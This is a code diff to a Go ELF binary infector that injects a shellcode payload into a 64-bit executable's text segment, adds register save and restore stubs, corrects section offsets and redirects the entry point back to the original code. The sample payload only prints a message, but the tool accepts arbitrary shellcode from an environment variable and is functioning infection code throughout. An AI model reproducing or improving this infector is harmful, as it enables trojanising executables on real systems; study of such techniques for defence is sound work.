@@ -34,17 +34,23 @@ type targetBin struct {
 	Shdrs   interface{}
 	Phdrs   interface{}
 	Fh      *os.File
-	Payload bytes.Buffer //payload to inject into binary
-
-	//oFileHandle *os.File 			//file handle for binary
+	Payload bytes.Buffer
 }
 
-var defaultPayload64 = []byte{
+var preserve64 = []byte {
 	0x57,       //push   %rdi
 	0x56,       //push   %rsi
 	0x52,       //push   %rdx
-	0xeb, 0x00, //jmp    401005 <message>
+}
 
+var restoration64 = []byte {
+	0x5a, 		//pop    %rdx
+	0x5e, 		//pop    %rsi
+	0x5f, 		//pop    %rdi
+}
+
+var defaultPayload64 = []byte{
+	0xeb, 0x00, //jmp    401005 <message>
 	//0000000000401005 <message>:
 	0xe8, 0x2b, 0x00, 0x00, 0x00, //call   401035 <shellcode>
 	0x68, 0x65, 0x6c, 0x6c, 0x6f, //push   $0x6f6c6c65
@@ -69,20 +75,6 @@ var defaultPayload64 = []byte{
 	0x5e,                         //pop    %rsi
 	0xba, 0x2a, 0x00, 0x00, 0x00, //mov    $0x2a,%edx
 	0x0f, 0x05, //syscall
-	0x5a, //pop    %rdx
-	0x5e, //pop    %rsi
-	0x5f, //pop    %rdi
-	/*
-		0xe8, 0x12, 0x00, 0x00, 0x00, //call   401061 <get_eip>
-		0x48, 0x83, 0xe8, 0x4f, 	//sub    $0x4f,%rax
-		0x48, 0x2d, 0xd1, 0x73, 0x01, 0x00, //sub    $0x173d1,%rax
-		0x48, 0x05, 0x20, 0x5b, 0x00, 0x00, //add    $0x5b20,%rax
-		0xff, 0xe0, //jmp    *%rax
-
-		//0000000000401061 <get_eip>:
-		0x48, 0x8b, 0x04, 0x24, //mov    (%rsp),%rax
-		0xc3, //ret
-	*/
 }
 
 func getPayloadFromEnv(p io.Writer, key string) (int, error) {
@@ -150,8 +142,10 @@ func (t *targetBin) infectBinary(debug bool) error {
 					fmt.Printf("[+] Payload size pre-epilogue 0x%x\n", t.Payload.Len())
 				}
 
+				t.Payload.Write(restoration64)
 				retStub = modEpilogue64(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header64).Entry, oEntry64)
 				t.Payload.Write(retStub)
+				
 				if debug {
 					fmt.Printf("[+] Payload size post-epilogue 0x%x\n", t.Payload.Len())
 
@@ -194,7 +188,7 @@ func (t *targetBin) infectBinary(debug bool) error {
 				if debug {
 					fmt.Printf("[+] (%d) Updating sections past text segment @ addr 0x%x\n", k, sectionHdrTable[k].Addr)
 				}
-				t.Shdrs.([]elf.Section64)[k].Off = uint64(PAGE_SIZE)
+				t.Shdrs.([]elf.Section64)[k].Off += uint64(PAGE_SIZE)
 			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header64).Entry {
 				if debug {
 					fmt.Println("[+] Extending section header entry for text section by payload len.")
@@ -242,6 +236,7 @@ func (t *targetBin) infectBinary(debug bool) error {
 	}
 
 	infected.Write(t.Contents[ephdrsz:])
+
 	infectedShdrTable := new(bytes.Buffer)
 	switch t.EIdent.Arch {
 	case elf.ELFCLASS64:	
@@ -418,6 +413,15 @@ func main() {
 
 	if err := t.enumIdent(); err != nil {
 		fmt.Println(err)
+		return
+	}
+	
+
+	switch t.EIdent.Arch {
+	case elf.ELFCLASS64:
+		t.Payload.Write(preserve64)
+	case elf.ELFCLASS32:
+		fmt.Println("32-bit not supported yet")
 		return
 	}
 
